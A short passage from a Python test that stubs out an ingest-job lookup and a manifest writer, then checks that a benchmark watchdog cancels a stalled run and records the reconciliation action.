    db.commit()

    monkeypatch.setattr("app.services.job_watchdog._find_ingest_job", lambda _evidence_id: {"exists": True, "status": "started", "job_id": "job-1"})
    monkeypatch.setattr("app.services.job_watchdog.write_manifest", lambda *args, **kwargs: None)

    benchmark = run_benchmark_watchdog(db, evidence.id, "bench-watchdog-5")

    assert benchmark["status"] == "cancelled"
    assert benchmark["watchdog_status"] == "timed_out_reconciled"
    assert benchmark["watchdog_actions"][-1]["action"] == "cancel_stalled_run"
